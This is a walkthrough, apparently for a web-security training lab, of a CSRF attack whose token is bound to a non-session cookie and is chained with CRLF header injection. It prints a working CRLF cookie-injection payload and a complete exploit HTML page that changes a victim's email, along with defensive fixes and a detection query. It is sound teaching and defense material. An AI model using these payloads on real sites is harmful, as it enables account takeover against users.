
# Lab Walkthrough: CSRF where token is tied to non-session cookie

* **Vulnerability Type:** Cross-Site Request Forgery (CSRF) / Flawed Token Binding & HTTP Response Splitting
* **Target Context:** Client-Side State-Changing Action (Email Update)
* **Skill Level:** Practitioner (Intermediate)
* **Estimated Completion Time:** 20–30 minutes
* **Lab Status:**  Solved

---

## 1. Vulnerability Architecture & Mechanism

This vulnerability exposes a flawed implementation of the "Double Submit Cookie" or strictly bound token pattern.

* **The Core Flaw:** The application does not store the CSRF token in the server-side session object. Instead, it issues a secondary cookie (e.g., `csrfKey`) and pairs it with a hidden form token (e.g., `csrf`). When a POST request is made, the server simply verifies that the hidden `csrf` form token mathematically corresponds to the `csrfKey` cookie. Crucially, the server does *not* verify that the `csrfKey` cookie belongs to the authenticated `session` cookie.
* **The Mechanism:** To exploit this, an attacker only needs to force the victim's browser to adopt a known `csrfKey` cookie. If the attacker can inject this cookie into the victim's browser (e.g., via a CRLF/HTTP Response Splitting vulnerability elsewhere on the site), they can then submit a CSRF payload containing the corresponding `csrf` token. The server sees a matched pair (Key + Token) alongside a valid session, and authorizes the request.
* **Real-World Analogy:** A secure facility requires both an ID badge (session) and a temporary visitor pass (CSRF token) to enter a restricted room. The visitor pass consists of two parts: a wearable lanyard (the `csrfKey` cookie) and a printed barcode (the hidden `csrf` token). The guard checks that the ID badge is valid, and checks that the barcode matches the lanyard. However, the guard never checks if the lanyard was actually assigned to the person wearing the ID badge. If an attacker can slip their own lanyard around the victim's neck and hand them the matching barcode, the guard lets them in.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                   NON-SESSION BOUND CSRF EXPLOIT FLOW                  │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker Token Harvesting]
  Attacker logs in. Server sets two cookies: `session=A` and `csrfKey=B`.
  Form contains hidden token: `csrf=C`.
  (Backend rule: Token C is valid if paired with Key B).

  [2. Cookie Injection Vector (CRLF)]
  Attacker finds a search function that reflects input into a Set-Cookie header.
  Payload: `/?search=test%0d%0aSet-Cookie:%20csrfKey=B`

  [3. Weaponization & Delivery]
  Attacker builds an HTML page that:
  a) Forces the victim to request the CRLF URL, setting their `csrfKey` to B.
  b) Immediately submits the forged POST request containing `csrf=C`.

  [4. Backend Flawed Validation]
  Victim's Request includes:
  - Cookies: `session=VICTIM` & `csrfKey=B` (Injected)
  - Body: email=hacker@evil.com & `csrf=C` (Attacker's)
  
  Server evaluates: Does `csrf=C` match `csrfKey=B`? -> YES. (Bypass achieved).

```

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The `/my-account/change-email` POST endpoint (CSRF target) and the `/?search=` endpoint (Cookie injection vector).
* **Primary Objective:** Exploit the HTTP Response Splitting vulnerability in the search function to inject a known `csrfKey` cookie into the victim's browser, then execute a CSRF attack using the corresponding `csrf` token.
* **Validation Signal:** The lab is marked solved when the victim's email address is successfully updated to an attacker-controlled address.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Token Harvesting & State Analysis

* Log into the application (`wiener:peter`).
* Observe the HTTP traffic in Burp Proxy. Notice that authentication sets two cookies: `session` and `csrfKey`.
* Navigate to the email update form. Intercept the submission.
* *Action:* Copy the value of the `csrfKey` cookie and the hidden `csrf` form token. Drop the request to keep them fresh.

### Phase 2: Identifying the Cookie Injection Vector

* To force the victim to use your `csrfKey`, you must find a way to set a cookie on the target domain.
* Test the search functionality: `/?search=test`.
* Observe the HTTP response. The application tracks the last search term by echoing the input directly into a `Set-Cookie` header:
`Set-Cookie: LastSearchTerm=test`
* Attempt HTTP Response Splitting (CRLF Injection) by injecting a carriage return (`%0d`) and line feed (`%0a`), followed by a new header:
`/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_HARVESTED_KEY`
* *Result:* The server responds with two distinct `Set-Cookie` directives, successfully setting the `csrfKey` in the browser.

### Phase 3: Weaponization

* Construct the CSRF HTML payload. The exploit must execute in a specific order: first set the cookie via the CRLF injection, then submit the CSRF form.
* This is achieved by loading the CRLF payload in an `<img>` tag. Because the URL does not return a valid image, the `onerror` event handler will trigger immediately after the HTTP response (and the `Set-Cookie` directive) is processed. The `onerror` handler then submits the form.

**Constructed Exploit HTML:**

```html
<!DOCTYPE html>
<html>
  <body>
    <!-- The forged state-changing request -->
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="csrf" value="YOUR_HARVESTED_CSRF_TOKEN" />
    </form>
    
    <!-- 1. The src attribute forces a GET request, triggering the CRLF vulnerability -->
    <!--    which overwrites the victim's csrfKey cookie with the attacker's key. -->
    <!-- 2. The image fails to load, triggering onerror, which submits the form. -->
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_HARVESTED_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

*(Note: `%3b%20SameSite=None` is appended to ensure modern browsers accept the cross-site cookie injection).*

### Phase 4: Delivery

* Store the crafted HTML on the Exploit Server.
* Click "Deliver exploit to victim".
* *Result:* The victim's browser loads the image URL (injecting the cookie), errors out, submits the POST request containing your valid token, and the server accepts the matched pair.

---

## 4. Execution Insight: The Strict-Binding Failure

This vulnerability exists because developers often attempt to implement stateless CSRF protection (like the Double Submit Cookie pattern) without cryptographically tying the components to the authenticated user.

If a `csrfKey` cookie is simply a random string that acts as a decryption key for the `csrf` token, the system is entirely stateless. The server doesn't need to look up a session in a database; it just runs a mathematical check. However, if an attacker finds *any* sub-domain takeover, XSS, or CRLF vulnerability across the entire domain architecture, they can overwrite that stateless cookie.

---

## 5. Defense, Hardening & Secure Coding

To secure anti-CSRF tokens, they must be inextricably linked to the user's identity.

* **Session-Bound Tokens (Primary Defense):** The CSRF token must be stored inside the server-side session object associated with the user's authentication cookie.
* *Validation Logic:* `if (POST['csrf'] === $_SESSION['csrf_token']) { ... }`
* With this logic, injecting a secondary cookie achieves nothing, as the server relies entirely on its internal, unforgeable session state.


* **Cryptographic Binding (Stateless Alternative):** If server-side state is impossible, the token itself must contain a cryptographically signed hash of the user's session ID.
* `Token = HMAC(SessionID, ServerSecret)`
* When submitted, the server recalculates the HMAC using the user's *actual* session cookie. If the attacker injected a token generated for their own session, the HMACs will not match.


* **Sanitize HTTP Headers (CRLF Prevention):** The secondary vulnerability (HTTP Response Splitting) must be remediated by stripping all carriage return (`\r`) and line feed (`\n`) characters from user input before reflecting it into HTTP headers. Modern web frameworks handle this automatically.

---

## 6. SIEM Detection & Telemetry Analysis

Detecting this exploit chain requires correlating anomalous HTTP GET requests (the cookie injection) with subsequent POST requests.

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| transaction src_ip maxspan=10s
| search (uri_path="/?search=" uri_query="*%0d%0aSet-Cookie*") AND (uri_path="/my-account/change-email" method=POST)
| stats count by src_ip, user_agent

```

*Indicator of Attack (IoA):* An explicit CRLF injection attempt (`%0d%0aSet-Cookie`) immediately preceding a sensitive state-changing POST request from the same source IP is a high-confidence indicator of a chained CSRF exploit.

---

## 7. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Lab doesn't solve / 403 Forbidden** | Cookie Injection Timing. | If you use an auto-submitting `<script>` block instead of the `<img onerror>` trick, the browser might execute the POST request *before* the GET request finishes setting the cookie. The `onerror` event guarantees sequential execution. |
| **Exploit works manually but fails on Victim Bot** | SameSite attribute. | The victim's browser may reject the injected cookie if it lacks a `SameSite=None` attribute during a cross-site request. Ensure `%3b%20SameSite=None` (`; SameSite=None`) is appended to your CRLF payload. |
| **Invalid Token Error** | Token/Key Mismatch. | Ensure you are pairing the `csrf` token with the exact `csrfKey` cookie that was issued alongside it. If you refreshed the page on your attacker account between copying the key and copying the token, they may be out of sync. |
